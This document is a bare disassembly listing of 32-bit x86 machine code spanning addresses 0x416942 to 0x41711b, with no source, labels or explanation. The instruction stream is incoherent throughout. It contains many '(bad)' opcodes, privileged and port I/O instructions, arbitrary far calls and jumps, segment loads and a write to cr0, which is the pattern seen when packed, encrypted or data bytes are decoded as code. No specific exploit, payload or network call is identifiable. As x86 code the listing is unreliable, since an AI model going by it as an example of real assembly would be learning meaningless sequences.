  416942:	les    esp,FWORD PTR [esi-0x36]
  416945:	jo     0x416961
  416947:	sbb    BYTE PTR [esi-0x7e747ca8],0x35
  41694e:	sub    dh,BYTE PTR [edx+ecx*4+0x53fa77d9]
  416955:	push   ds
  416956:	pop    ss
  416957:	lea    esi,[esi+0x35]
  41695a:	ficomp WORD PTR ds:[edx]
  41695d:	mov    ebx,0xe8d1a723
  416962:	and    ebx,0xaf17a655
  416968:	mov    eax,esp
  41696a:	sbb    ebx,ebp
  41696c:	xor    al,0xaa
  41696e:	sbb    cl,BYTE PTR [ebp+ecx*1+0x67]
  416972:	int3   
  416973:	std    
  416974:	mov    fs,WORD PTR [ecx-0x7bd56e3a]
  41697a:	mov    DWORD PTR [ebp-0x21b2cd6c],ebp
  416980:	mov    ecx,DWORD PTR [edx]
  416982:	rcl    DWORD PTR [esi+ebp*1],1
  416985:	popa   
  416986:	loopne 0x41690b
  416988:	call   0x4d4b:0xb3e50a5c
  41698f:	mov    ds:0xda4a99dc,eax
  416994:	fistp  WORD PTR [edi+0x4a15016d]
  41699a:	pop    edx
  41699b:	add    bh,BYTE PTR [edi]
  41699d:	lods   eax,DWORD PTR ds:[esi]
  41699e:	xor    dh,0xc0
  4169a1:	and    BYTE PTR [eax],dh
  4169a3:	outs   dx,BYTE PTR ds:[esi]
  4169a4:	outs   dx,BYTE PTR ds:[esi]
  4169a5:	push   esp
  4169a6:	repz xchg edi,eax
  4169a8:	(bad)  
  4169a9:	daa    
  4169aa:	cmc    
  4169ab:	retf   
  4169ac:	retf   
  4169ad:	dec    ebp
  4169ae:	mov    eax,ds:0x75ed1e04
  4169b3:	dec    eax
  4169b4:	test   BYTE PTR [ebp-0x1a],ah
  4169b7:	add    eax,0x2b81b70e
  4169bc:	les    edi,FWORD PTR [eax-0x72e1ada9]
  4169c2:	and    BYTE PTR [esi+0x50df3343],0xdd
  4169c9:	jae    0x416a07
  4169cb:	and    cl,bl
  4169cd:	shl    esp,1
  4169cf:	aad    0xbc
  4169d1:	push   esi
  4169d2:	jo     0x4169ab
  4169d4:	and    esp,DWORD PTR ds:[esi+0x415b8ccf]
  4169db:	(bad)  
  4169dc:	dec    ebx
  4169dd:	pop    ss
  4169de:	int3   
  4169df:	xor    DWORD PTR ds:[ecx+0x45],esp
  4169e3:	enter  0xc215,0xef
  4169e7:	sbb    BYTE PTR [edi-0x2],bh
  4169ea:	mov    eax,ds:0xa9bddde8
  4169ef:	mov    cl,0xc2
  4169f1:	jns    0x416a14
  4169f3:	add    al,0xc0
  4169f5:	mov    ah,0x46
  4169f7:	leave  
  4169f8:	inc    edx
  4169f9:	in     eax,dx
  4169fa:	mov    eax,0x58109e75
  4169ff:	sub    BYTE PTR [edi],dh
  416a01:	add    al,0xc0
  416a03:	mov    ch,0x21
  416a05:	fbld   TBYTE PTR [edi-0x46]
  416a08:	test   al,0x93
  416a0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a0b:	adc    al,BYTE PTR [edx+0x636504ed]
  416a11:	and    eax,0x862a704f
  416a16:	mov    ds:0x7de5e850,eax
  416a1b:	dec    esp
  416a1c:	dec    ecx
  416a1d:	mov    ah,BYTE PTR [esi-0x1582f95a]
  416a23:	sar    DWORD PTR [edi-0x1b],cl
  416a26:	lock dec esp
  416a28:	cwde   
  416a29:	push   eax
  416a2a:	hlt    
  416a2b:	adc    ecx,edi
  416a2d:	daa    
  416a2e:	sub    al,0xcb
  416a30:	rcl    DWORD PTR [ebp-0x63],0x60
  416a34:	cli    
  416a35:	push   es
  416a36:	inc    esp
  416a37:	outs   dx,DWORD PTR ds:[esi]
  416a38:	adc    BYTE PTR [eax+0x27],dl
  416a3b:	cmp    edi,ebx
  416a3d:	jmp    0x18d1bd4e
  416a42:	stos   DWORD PTR es:[edi],eax
  416a43:	push   ebx
  416a44:	iret   
  416a45:	adc    al,BYTE PTR [eax]
  416a47:	dec    ebp
  416a48:	cmp    BYTE PTR [edi-0x5904d735],cl
  416a4e:	ret    0x78f0
  416a51:	pop    ebp
  416a52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a53:	scas   al,BYTE PTR es:[edi]
  416a54:	sbb    BYTE PTR [eax+0x16166d4],0x75
  416a5b:	aas    
  416a5c:	xor    eax,0x772e1feb
  416a61:	cmp    ecx,0x67
  416a64:	jns    0x416aa4
  416a66:	cwde   
  416a67:	mov    bh,0xd1
  416a69:	shl    BYTE PTR [edx+ecx*2-0x3e6c8b13],0x94
  416a71:	arpl   WORD PTR [eax+0x9],dx
  416a74:	add    al,0x5a
  416a76:	xor    DWORD PTR [esi+0x2b39599f],ebx
  416a7c:	xor    al,ch
  416a7e:	les    edx,FWORD PTR [ecx+0x6d3c0662]
  416a84:	adc    ecx,DWORD PTR [edx+0x5e093a1e]
  416a8a:	stos   BYTE PTR es:[edi],al
  416a8b:	jmp    0x20fec4c3
  416a90:	add    DWORD PTR [ebx],0xf7b1e50b
  416a96:	and    al,0x6d
  416a98:	add    eax,0x8db67c02
  416a9d:	test   dl,0x4a
  416aa0:	imul   ebp,DWORD PTR [esp+edi*4+0x4d202c60],0x23
  416aa8:	shl    DWORD PTR [edx+0x6e],1
  416aab:	lods   al,BYTE PTR ds:[esi]
  416aac:	mov    edx,ds
  416aae:	xchg   esp,eax
  416aaf:	in     eax,dx
  416ab0:	sub    eax,0xdac16140
  416ab5:	arpl   WORD PTR [esi-0x2a],sp
  416ab8:	cmp    bh,BYTE PTR ds:0x1ad4cdd8
  416abe:	(bad)  
  416abf:	mov    ebx,0x6eb93f67
  416ac4:	pop    ds
  416ac5:	lahf   
  416ac6:	loope  0x416ac1
  416ac8:	fld    QWORD PTR [eax]
  416aca:	imul   esp,DWORD PTR [ebp-0x2f],0x60
  416ace:	pusha  
  416acf:	mov    DWORD PTR [ebx],0x7c5ead72
  416ad5:	das    
  416ad6:	aas    
  416ad7:	xchg   edx,eax
  416ad8:	push   0x3b
  416ada:	clc    
  416adb:	pushf  
  416adc:	pushf  
  416add:	adc    eax,ebp
  416adf:	lock sub eax,DWORD PTR [edx-0x6f]
  416ae3:	push   cs
  416ae4:	xchg   esi,eax
  416ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ae6:	mov    ah,0x9
  416ae8:	loope  0x416b5a
  416aea:	add    al,BYTE PTR [ebx+ecx*1+0x4a]
  416aee:	jns    0x416b58
  416af0:	aam    0x3e
  416af2:	pop    ds
  416af3:	mov    esi,0x93577941
  416af8:	scas   eax,DWORD PTR es:[edi]
  416af9:	push   esp
  416afa:	pop    ss
  416afb:	pop    ss
  416afc:	mov    ah,0xea
  416afe:	inc    esi
  416aff:	adc    DWORD PTR [edi],esp
  416b01:	inc    esp
  416b02:	gs sub ebx,edx
  416b05:	dec    ebx
  416b06:	inc    edi
  416b07:	or     BYTE PTR ss:[ebp+0x5f],al
  416b0b:	jo     0x416b53
  416b0d:	sub    al,BYTE PTR [edi-0x7bd86ac8]
  416b13:	fcmovnu st,st(1)
  416b15:	adc    eax,0x1379797a
  416b1a:	iret   
  416b1b:	out    dx,eax
  416b1c:	mov    BYTE PTR [ecx+eax*4+0x36],0xb5
  416b21:	and    eax,0xef545e48
  416b26:	icebp  
  416b27:	cmp    cl,cl
  416b29:	dec    esp
  416b2a:	dec    ecx
  416b2b:	scas   eax,DWORD PTR es:[edi]
  416b2c:	mov    esp,0xd5d1a677
  416b31:	dec    edx
  416b32:	adc    al,0xcc
  416b34:	aaa    
  416b35:	sub    esi,ecx
  416b37:	inc    edi
  416b38:	ins    DWORD PTR es:[edi],dx
  416b39:	dec    edi
  416b3a:	add    eax,0xbdb73be6
  416b3f:	fs or  al,0x3f
  416b42:	popf   
  416b43:	jecxz  0x416ae1
  416b45:	jmp    0x3b51:0x92e620d5
  416b4c:	iret   
  416b4d:	lods   al,BYTE PTR ds:[esi]
  416b4e:	mov    esi,0xc0623906
  416b53:	sub    eax,0x8809e694
  416b58:	ins    BYTE PTR es:[edi],dx
  416b59:	leave  
  416b5a:	xor    ch,BYTE PTR [edi-0x1]
  416b5d:	aaa    
  416b5e:	pushf  
  416b5f:	and    esi,DWORD PTR [ebx+0x44]
  416b62:	nop
  416b63:	dec    esp
  416b64:	and    BYTE PTR [edx+0x1b],al
  416b67:	pop    esp
  416b68:	sbb    ecx,DWORD PTR [eax+0xd1a0ffc]
  416b6e:	fcom   QWORD PTR [ebp-0x36]
  416b71:	and    al,0xd5
  416b73:	dec    esi
  416b74:	test   DWORD PTR [eax],esi
  416b76:	xor    edx,DWORD PTR [ebx+0x3b2d907f]
  416b7c:	call   0xe2b2:0xa2fad287
  416b83:	push   ds
  416b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b85:	repz out 0xc2,eax
  416b88:	mov    eax,?
  416b8a:	mov    eax,0xe26e734b
  416b8f:	sbb    al,0xd7
  416b91:	jge    0x416b6f
  416b93:	cmp    BYTE PTR [esi+0x7d40188a],bh
  416b99:	dec    ebp
  416b9a:	fadd   QWORD PTR [esi+0x6a207653]
  416ba0:	(bad)  
  416ba1:	fild   QWORD PTR [edx+ebx*1+0x25]
  416ba5:	cmc    
  416ba6:	cli    
  416ba7:	mov    ecx,0x3ff776f9
  416bac:	xchg   edi,eax
  416bad:	xor    al,0x56
  416baf:	dec    eax
  416bb0:	loopne 0x416be6
  416bb2:	dec    esp
  416bb3:	cmp    BYTE PTR [ecx],ch
  416bb5:	cld    
  416bb6:	xor    DWORD PTR [esi-0x2f221b92],ebx
  416bbc:	dec    ebp
  416bbd:	test   al,0x48
  416bbf:	mov    ds:0x43a82e38,eax
  416bc4:	xor    edx,DWORD PTR [ecx]
  416bc6:	cwde   
  416bc7:	cmp    BYTE PTR [edx-0x6e],0xdb
  416bcb:	mov    ebx,0xc9a42533
  416bd0:	pop    ss
  416bd1:	into   
  416bd2:	xchg   DWORD PTR gs:0xed0b8a0e,esi
  416bd9:	xor    edx,ebx
  416bdb:	mov    fs,WORD PTR [ebp-0xf06bff6]
  416be1:	int3   
  416be2:	aad    0xe5
  416be4:	xchg   esp,eax
  416be5:	cmp    eax,0x370c0e0
  416bea:	mov    DWORD PTR [edx-0x22f98a8f],ebp
  416bf0:	mov    esp,ebp
  416bf2:	outs   dx,DWORD PTR ds:[esi]
  416bf3:	pop    ebp
  416bf4:	inc    ebx
  416bf5:	pop    eax
  416bf6:	and    al,BYTE PTR [edx]
  416bf8:	nop
  416bf9:	push   0x6cc7f978
  416bfe:	xchg   BYTE PTR [esi+0x717a958b],ah
  416c04:	(bad)  
  416c05:	out    0x2a,al
  416c07:	je     0x416bc5
  416c09:	push   ebx
  416c0a:	cmc    
  416c0b:	dec    ebx
  416c0c:	jo     0x416c7b
  416c0e:	sub    al,BYTE PTR [edi]
  416c10:	ret    0xd04a
  416c13:	inc    esi
  416c14:	in     eax,0xa6
  416c16:	push   ss
  416c17:	or     al,BYTE PTR [eax+0x4803a8d3]
  416c1d:	js     0x416bb8
  416c1f:	loop   0x416bf5
  416c21:	dec    eax
  416c22:	lock je 0x416c68
  416c25:	xor    dl,BYTE PTR [ecx+0x7907fcf3]
  416c2b:	push   ebx
  416c2d:	neg    DWORD PTR [ebx-0x3e1d6ec]
  416c33:	and    al,bh
  416c35:	cmp    BYTE PTR [esi-0x5c51a2c3],dl
  416c3b:	pop    ebx
  416c3c:	adc    edi,0xc169e730
  416c42:	and    dh,BYTE PTR [eax]
  416c44:	popa   
  416c45:	sbb    eax,ebp
  416c47:	ins    BYTE PTR es:[edi],dx
  416c48:	cmp    eax,0xe7247f30
  416c4d:	pop    edx
  416c4e:	pop    es
  416c4f:	dec    ecx
  416c50:	pop    es
  416c51:	(bad)  
  416c53:	xor    al,0xba
  416c55:	xor    al,0xbf
  416c57:	pushfw 
  416c59:	js     0x416c73
  416c5b:	sub    eax,DWORD PTR [edx+0xad17721]
  416c61:	mov    ch,0xe
  416c63:	test   eax,0xbe397ba5
  416c68:	mov    al,0xb8
  416c6a:	mov    eax,ds:0xa59fe9b2
  416c6f:	jno    0x416c0f
  416c71:	or     edi,DWORD PTR [edx]
  416c73:	fnstsw WORD PTR [ebp-0x40]
  416c76:	cwde   
  416c77:	mov    edi,DWORD PTR [edi-0x7529d8cd]
  416c7d:	ficomp WORD PTR [edx-0x134d3feb]
  416c83:	loopne 0x416cef
  416c85:	(bad)  
  416c86:	pop    eax
  416c87:	repz das 
  416c89:	das    
  416c8a:	jle    0x416c0c
  416c8c:	jnp    0x416cf6
  416c8e:	cmp    edi,DWORD PTR [ebp+0x3cfed884]
  416c94:	dec    esi
  416c95:	add    ecx,ebp
  416c97:	xchg   ebp,eax
  416c98:	stos   DWORD PTR es:[edi],eax
  416c99:	fcomp  QWORD PTR [ebx-0x303e7f6c]
  416c9f:	pop    ebx
  416ca0:	add    eax,0xa3ed6a9e
  416ca5:	sub    ebp,DWORD PTR [edi]
  416ca7:	ss sti 
  416ca9:	push   edi
  416caa:	test   eax,0xc143615e
  416caf:	push   ss
  416cb0:	adc    DWORD PTR [esi],0x61
  416cb3:	dec    edi
  416cb4:	inc    edx
  416cb5:	pop    ecx
  416cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cb7:	stos   DWORD PTR es:[edi],eax
  416cb8:	xor    DWORD PTR [edx+0x76],ebp
  416cbb:	lock push esi
  416cbd:	ins    BYTE PTR es:[edi],dx
  416cbe:	inc    edx
  416cbf:	adc    al,bl
  416cc1:	imul   ebp,DWORD PTR [ecx-0x54],0xab01eef0
  416cc8:	cmp    BYTE PTR [edi+0x6ca11628],ch
  416cce:	(bad)  
  416ccf:	mov    ebx,0xab2fe9f5
  416cd4:	adc    al,bl
  416cd6:	pop    es
  416cd7:	bound  edi,QWORD PTR [esp+ecx*4+0x7e]
  416cdb:	hlt    
  416cdc:	jae    0x416d2b
  416cde:	jno    0x416c6f
  416ce0:	add    al,0x69
  416ce2:	aam    0xf5
  416ce4:	mov    WORD PTR [edx-0x1ef01465],?
  416cea:	mov    eax,ds:0x8f63901e
  416cef:	fs jp  0x416d35
  416cf2:	repz lock or esi,DWORD PTR [esi-0x68]
  416cf7:	sahf   
  416cf8:	inc    edx
  416cf9:	repnz out 0x92,eax
  416cfc:	mov    ebx,DWORD PTR [eax-0x3f1c3c48]
  416d02:	mov    cl,0x38
  416d04:	push   ds
  416d05:	pop    esp
  416d06:	xor    DWORD PTR [edi-0x3de99f67],0xe629ba27
  416d10:	ins    BYTE PTR es:[edi],dx
  416d11:	dec    edi
  416d12:	scas   eax,DWORD PTR es:[edi]
  416d13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d14:	dec    esi
  416d15:	out    dx,eax
  416d16:	shr    DWORD PTR ds:0x8a3776b6,0x7a
  416d1d:	inc    eax
  416d1e:	dec    esp
  416d1f:	lods   al,BYTE PTR ds:[esi]
  416d20:	ins    DWORD PTR es:[edi],dx
  416d21:	jle    0x416cb1
  416d23:	mov    esi,0x54a9ac5b
  416d28:	adc    ch,cl
  416d2a:	pop    edx
  416d2b:	mov    bl,0x2f
  416d2d:	mov    al,BYTE PTR [eax-0x74ed4f8d]
  416d33:	and    al,0xca
  416d35:	add    ebp,DWORD PTR [eax]
  416d37:	(bad)  
  416d38:	loopne 0x416d2a
  416d3a:	inc    esp
  416d3b:	rol    ebx,0x93
  416d3e:	sbb    edi,esp
  416d40:	jmp    0xc0411aa
  416d45:	out    dx,eax
  416d46:	sub    DWORD PTR ss:[ecx],ebx
  416d49:	repz add al,BYTE PTR [eax+0x53]
  416d4d:	and    eax,0x95b2081f
  416d52:	fdivr  QWORD PTR ds:0x54147c5b
  416d58:	xor    eax,0x5e41a070
  416d5d:	xor    bl,BYTE PTR [edx+0x598de91a]
  416d63:	fwait
  416d64:	stc    
  416d65:	jge    0x7be5af94
  416d6b:	lea    edx,[ebp-0x24aed011]
  416d71:	shr    DWORD PTR [esp+ecx*1+0x71],1
  416d75:	fwait
  416d76:	or     eax,0x88b2860b
  416d7b:	mov    dl,0x86
  416d7d:	xor    DWORD PTR [eax-0x47ef0428],esi
  416d83:	hlt    
  416d84:	mov    al,ds:0x6e1b201f
  416d89:	retf   0x4473
  416d8c:	xor    bl,BYTE PTR [edx-0x110d06ba]
  416d92:	add    DWORD PTR [edx],ebx
  416d94:	rcl    BYTE PTR [ebx],0xfb
  416d97:	and    al,0xd
  416d9a:	(bad)  
  416d9b:	ds push 0x45c70168
  416da1:	push   ebx
  416da2:	dec    esp
  416da3:	push   ss
  416da4:	mov    ds:0x68963abb,al
  416da9:	fmul   QWORD PTR [edx+eax*4+0x4d]
  416dad:	aad    0x8e
  416daf:	enter  0xb42a,0xaf
  416db3:	or     al,0x26
  416db5:	and    ebp,ecx
  416db7:	sub    eax,0xc9ee6b90
  416dbc:	push   0x3a
  416dbe:	and    DWORD PTR [esi],edx
  416dc0:	push   esi
  416dc1:	imul   DWORD PTR [edx+0x4c]
  416dc4:	cmc    
  416dc5:	(bad)  
  416dc6:	xor    al,0xed
  416dc8:	lods   eax,DWORD PTR ds:[esi]
  416dc9:	enter  0x3b91,0x92
  416dcd:	(bad)  
  416dcf:	mov    al,ds:0x6f50758c
  416dd4:	pop    ebx
  416dd5:	ret    
  416dd6:	add    ebp,esp
  416dd8:	in     al,0x9d
  416dda:	nop
  416ddb:	out    dx,al
  416ddc:	mov    esi,0x14ec8ee6
  416de1:	mov    cl,0xf
  416de3:	jne    0x416e36
  416de5:	test   eax,0x3d6f9351
  416dea:	ins    BYTE PTR es:[edi],dx
  416deb:	inc    edi
  416dec:	sar    DWORD PTR [ecx],0x41
  416def:	stos   BYTE PTR es:[edi],al
  416df0:	shl    BYTE PTR [eax],cl
  416df2:	sub    al,0xa4
  416df4:	jmp    0x2e6f2da
  416df9:	rol    BYTE PTR [esp+edx*4-0x4],1
  416dfd:	push   cs
  416dfe:	xlat   BYTE PTR ds:[ebx]
  416dff:	test   eax,0x9d191dc9
  416e04:	out    dx,eax
  416e05:	add    esi,DWORD PTR [ebp-0x4813ff94]
  416e0b:	pop    ds
  416e0c:	and    al,dh
  416e0e:	sbb    eax,0x4bf07319
  416e13:	xor    dh,0xa2
  416e16:	push   es
  416e17:	or     al,0x23
  416e19:	out    dx,al
  416e1a:	xchg   ebp,eax
  416e1b:	dec    ebp
  416e1c:	(bad)  
  416e1d:	xchg   esp,eax
  416e1e:	fcomp  DWORD PTR [ecx]
  416e20:	mov    ds:0xd8eac16a,al
  416e25:	cld    
  416e26:	imul   edx,DWORD PTR [edx+0x78],0xd
  416e2a:	data16 jp 0x416dff
  416e2d:	pop    ecx
  416e2e:	inc    esi
  416e2f:	sub    BYTE PTR [ecx],bl
  416e31:	cmc    
  416e32:	dec    esi
  416e33:	dec    ecx
  416e34:	lahf   
  416e35:	imul   esp,ebp,0x4c
  416e38:	out    0x75,eax
  416e3a:	test   BYTE PTR [ecx],0x31
  416e3d:	dec    ebp
  416e3e:	rcr    dh,0x1c
  416e41:	sub    eax,0x970594be
  416e46:	test   eax,edi
  416e48:	dec    eax
  416e49:	xor    esp,DWORD PTR [ebp+0x6e0da898]
  416e4f:	mov    ebp,0x37531c0b
  416e54:	mov    ds:0xc315224,al
  416e59:	cmp    BYTE PTR [ebp-0x3105eccd],dh
  416e5f:	dec    ebx
  416e60:	sahf   
  416e61:	aas    
  416e62:	mov    cl,0x14
  416e64:	and    esp,DWORD PTR [esi-0x3f]
  416e67:	or     eax,0x87731bbb
  416e6c:	push   0x72e8fc53
  416e71:	xor    eax,0x42d9793
  416e76:	js     0x416e03
  416e78:	inc    esp
  416e79:	pop    ss
  416e7a:	fidiv  DWORD PTR [ebx]
  416e7c:	cmc    
  416e7d:	dec    esp
  416e7e:	and    ecx,DWORD PTR [ebp-0x73]
  416e81:	cmc    
  416e82:	and    al,0xb8
  416e84:	fisttp DWORD PTR [eax+edx*2]
  416e87:	dec    ecx
  416e88:	jmp    0x6799:0x160c2a86
  416e8f:	push   ss
  416e90:	pop    ebx
  416e91:	push   esi
  416e92:	dec    edi
  416e93:	jl     0x416e53
  416e95:	stos   DWORD PTR es:[edi],eax
  416e96:	dec    ebx
  416e97:	dec    esi
  416e98:	je     0x416f08
  416e9a:	jmp    0x416ec7
  416e9c:	div    BYTE PTR [ebx+0x1f]
  416e9f:	popf   
  416ea0:	adc    dl,BYTE PTR [ebp+0x7a52d3cb]
  416ea6:	fnstsw WORD PTR [edi]
  416ea8:	popf   
  416ea9:	push   0xffffffa1
  416eab:	dec    eax
  416eac:	aas    
  416ead:	ins    DWORD PTR es:[edi],dx
  416eae:	sub    bh,BYTE PTR [ecx]
  416eb0:	arpl   dx,ax
  416eb2:	inc    ebx
  416eb3:	jmp    0xcb527d5c
  416eb8:	aad    0x8
  416eba:	aam    0x50
  416ebc:	loop   0x416e55
  416ebe:	sti    
  416ebf:	and    DWORD PTR [ecx],0xdc302bbd
  416ec5:	pushf  
  416ec6:	in     al,dx
  416ec7:	xchg   edi,eax
  416ec8:	mov    dh,0x80
  416eca:	out    0x19,al
  416ecc:	sbb    DWORD PTR es:[ebx],esp
  416ecf:	les    ebx,FWORD PTR [edi]
  416ed1:	loopne 0x416ee2
  416ed3:	enter  0x2dbf,0xba
  416ed7:	mov    esi,0xcc11159f
  416edc:	cmp    eax,0x564f4c23
  416ee1:	addr16 mov esp,0xa538b785
  416ee7:	lahf   
  416ee8:	or     al,0xa5
  416eea:	loope  0x416ed8
  416eec:	pop    edi
  416eed:	sbb    BYTE PTR [ecx],bl
  416eef:	ins    BYTE PTR es:[edi],dx
  416ef0:	and    edi,eax
  416ef2:	pop    ebx
  416ef3:	popf   
  416ef4:	push   edi
  416ef5:	mov    eax,DWORD PTR [edx]
  416ef7:	(bad)  
  416ef8:	and    cl,BYTE PTR [ebp-0x42f85e2]
  416efe:	bound  ecx,QWORD PTR [esi-0x4d]
  416f01:	mov    gs,WORD PTR [esp+esi*2+0x12d77814]
  416f08:	push   0x3e
  416f0a:	mov    eax,0x8a77ec1f
  416f0f:	push   edi
  416f10:	sub    al,0x3f
  416f12:	push   0xffffffcf
  416f14:	(bad)  
  416f15:	repnz adc cl,dl
  416f18:	xlat   BYTE PTR ds:[ebx]
  416f19:	rcr    BYTE PTR [ebx-0x71],cl
  416f1c:	shl    BYTE PTR [esi+0x2ef04582],0x4b
  416f23:	inc    edx
  416f24:	dec    esp
  416f25:	add    BYTE PTR [ebx-0x5],cl
  416f28:	sub    ch,BYTE PTR [ecx]
  416f2a:	or     cx,WORD PTR [eax+0x5affc797]
  416f31:	sub    BYTE PTR [ebp-0x28],al
  416f34:	fsub   QWORD PTR ds:0xd5c181e9
  416f3a:	inc    edi
  416f3b:	pop    edx
  416f3c:	cmp    ebx,eax
  416f3e:	rcr    DWORD PTR [ebx-0x607b685f],cl
  416f44:	repnz lock adc eax,0x5f8dce7a
  416f4b:	loop   0x416ef5
  416f4d:	xlat   BYTE PTR ds:[ebx]
  416f4e:	int    0xfc
  416f50:	iret   
  416f51:	xchg   esp,eax
  416f52:	adc    BYTE PTR [esi+0x56043c28],ah
  416f58:	jl     0x416f0f
  416f5a:	mov    ds:0x463ebf51,al
  416f5f:	daa    
  416f60:	scas   al,BYTE PTR es:[edi]
  416f61:	and    DWORD PTR [esp+edx*2+0x25],esp
  416f65:	rcr    DWORD PTR [ebp+0x6f],0xa9
  416f69:	in     eax,dx
  416f6a:	push   edx
  416f6b:	ret    
  416f6c:	call   0x91d6:0x32d5d15c
  416f73:	(bad)  
  416f74:	fadd   DWORD PTR [eax]
  416f76:	cvttps2dq xmm1,XMMWORD PTR [ecx]
  416f7a:	(bad)  
  416f7b:	jecxz  0x416f5b
  416f7d:	retf   
  416f7e:	pop    esi
  416f7f:	lods   al,BYTE PTR ds:[esi]
  416f80:	pop    ecx
  416f81:	imul   edi,DWORD PTR [ecx],0xffffff9b
  416f84:	sub    ebp,DWORD PTR [ebp+0x6f3ad948]
  416f8a:	shl    bl,0xd0
  416f8d:	jae    0x416f72
  416f8f:	sbb    BYTE PTR [eax+0x26],cl
  416f92:	mov    ebx,DWORD PTR [ebp+0x57]
  416f95:	jmp    0x9ecb7e03
  416f9a:	inc    ebp
  416f9b:	jmp    0x54c224bc
  416fa0:	pop    ss
  416fa1:	sub    DWORD PTR [edx-0x8],eax
  416fa4:	adc    BYTE PTR [edi+0x68be975e],al
  416faa:	jecxz  0x416fec
  416fac:	outs   dx,BYTE PTR ds:[esi]
  416fad:	mov    dh,0xae
  416faf:	sbb    BYTE PTR [edx-0x7982fa63],0xda
  416fb6:	mov    edi,0x8aefbd2b
  416fbb:	hlt    
  416fbc:	fmul   DWORD PTR [edx]
  416fbe:	add    esi,ecx
  416fc0:	and    ah,ah
  416fc2:	aad    0xf0
  416fc4:	sub    eax,0xc23743ec
  416fc9:	adc    DWORD PTR [esi+0x29351c0],0xbe51460b
  416fd3:	sub    eax,0x8eccefca
  416fd8:	(bad)  [esi+0x1fb70385]
  416fde:	mov    al,ds:0xf9741aae
  416fe3:	cs xor al,0x76
  416fe6:	pusha  
  416fe7:	jae    0x41704f
  416fe9:	add    eax,0x34ddb8b4
  416fee:	cdq    
  416fef:	and    al,0x47
  416ff1:	aam    0xcb
  416ff3:	loopne 0x416f9a
  416ff5:	pop    eax
  416ff6:	xor    eax,0xb608f0cf
  416ffb:	jge    0x416fe3
  416ffd:	ret    
  416ffe:	add    DWORD PTR [edi],0x27f4d6b8
  417004:	sub    DWORD PTR [esi],esi
  417006:	sub    DWORD PTR [edi-0x46989bff],esp
  41700c:	or     bh,bh
  41700e:	xchg   esp,eax
  41700f:	and    eax,0xd2aa9d5b
  417014:	xor    ebx,DWORD PTR [ecx]
  417016:	scas   al,BYTE PTR es:[edi]
  417017:	leave  
  417018:	or     esi,esi
  41701a:	adc    al,0xed
  41701c:	pop    ss
  41701d:	je     0x416ff7
  41701f:	imul   edi,DWORD PTR [esi+0xb68ab54],0x5538a670
  417029:	dec    edx
  41702a:	shl    DWORD PTR [esi],1
  41702c:	pushf  
  41702d:	dec    esi
  41702e:	dec    ecx
  41702f:	inc    ecx
  417030:	push   ecx
  417031:	and    eax,0xe1923171
  417036:	cmc    
  417037:	dec    edi
  417038:	jge    0x417051
  41703a:	jne    0x4170a3
  41703c:	ror    BYTE PTR [eax],1
  41703e:	cs lock ins DWORD PTR es:[edi],dx
  417041:	mov    dh,0x58
  417043:	cmp    DWORD PTR [ecx+0x4f2304dd],edx
  417049:	cwde   
  41704a:	(bad)
  41704d:	pop    es
  41704e:	fdiv   QWORD PTR [ebp+0x3c8e6674]
  417054:	jg     0x416fea
  417056:	xchg   ebx,eax
  417057:	inc    ecx
  417058:	aas    
  417059:	xor    al,0x21
  41705b:	test   BYTE PTR [edi-0x5f],dh
  41705e:	enter  0xe838,0xee
  417062:	(bad)  
  417063:	push   edi
  417064:	ins    DWORD PTR es:[edi],dx
  417065:	mov    WORD PTR [esi+edx*1-0x193891bb],cs
  41706c:	cmp    edx,DWORD PTR [esi+0xcc750c2]
  417072:	add    eax,DWORD PTR [edx-0x50]
  417075:	(bad)  
  417077:	cmp    esi,eax
  417079:	xchg   edx,eax
  41707a:	or     al,0x7e
  41707c:	xchg   ebp,eax
  41707d:	and    DWORD PTR [eax+0x0],ecx
  417080:	xor    esp,DWORD PTR [edi-0x5786ad64]
  417086:	sbb    eax,0xae75a592
  41708b:	xor    bl,BYTE PTR [eax]
  41708d:	jbe    0x4170a0
  41708f:	mov    bl,0x51
  417091:	scas   eax,DWORD PTR es:[edi]
  417092:	popa   
  417093:	push   edx
  417094:	cmp    eax,0xf57b5799
  417099:	lds    eax,FWORD PTR [ecx]
  41709b:	loopne 0x41705c
  41709d:	mov    DWORD PTR [edx+0x5a208126],eax
  4170a3:	mov    esi,0x9f665dff
  4170a8:	xlat   BYTE PTR ds:[ebx]
  4170a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170aa:	pusha  
  4170ab:	gs sbb ebx,eax
  4170ae:	dec    ecx
  4170af:	pusha  
  4170b0:	xor    eax,0x9f40009e
  4170b5:	xlat   BYTE PTR ds:[ebx]
  4170b6:	add    eax,0xaabe4434
  4170bb:	ret    0x6c0c
  4170be:	popf   
  4170bf:	lods   eax,DWORD PTR ds:[esi]
  4170c0:	pop    es
  4170c1:	lods   al,BYTE PTR ds:[esi]
  4170c2:	test   al,0xbd
  4170c4:	sbb    esi,DWORD PTR [edx]
  4170c6:	hlt    
  4170c7:	sbb    esi,DWORD PTR [ebp+0x55]
  4170ca:	popf   
  4170cb:	scas   eax,DWORD PTR es:[edi]
  4170cc:	rol    DWORD PTR [ebx+0x1cbda801],cl
  4170d2:	sub    BYTE PTR [ebp-0x21],ah
  4170d5:	popa   
  4170d6:	rcl    ecx,0x39
  4170d9:	cdq    
  4170da:	jle    0x41709d
  4170dc:	xchg   DWORD PTR [ecx-0x64f8004e],edi
  4170e2:	sub    edi,ecx
  4170e4:	and    eax,0x413f038d
  4170e9:	mov    WORD PTR [edi+edi*8-0x69d0d686],es
  4170f0:	mov    al,ds:0x7a93acb4
  4170f5:	push   edi
  4170f6:	sbb    ebp,DWORD PTR [ecx+0x67]
  4170f9:	pop    esp
  4170fa:	test   DWORD PTR ds:0x8dc98a50,edi
  417100:	pop    edi
  417101:	sti    
  417102:	and    al,0xf8
  417104:	inc    ebp
  417105:	mov    esp,0x6ce62491
  41710a:	iret   
  41710b:	call   0xca4cc72d
  417110:	jmp    DWORD PTR [ebx+0x3e]
  417113:	out    0x11,al
  417115:	outs   dx,BYTE PTR ds:[esi]
  417116:	push   esi
  417117:	add    edx,ecx
  417119:	cmp    BYTE PTR [edi],dh
  41711b:	mov    cr0,esi
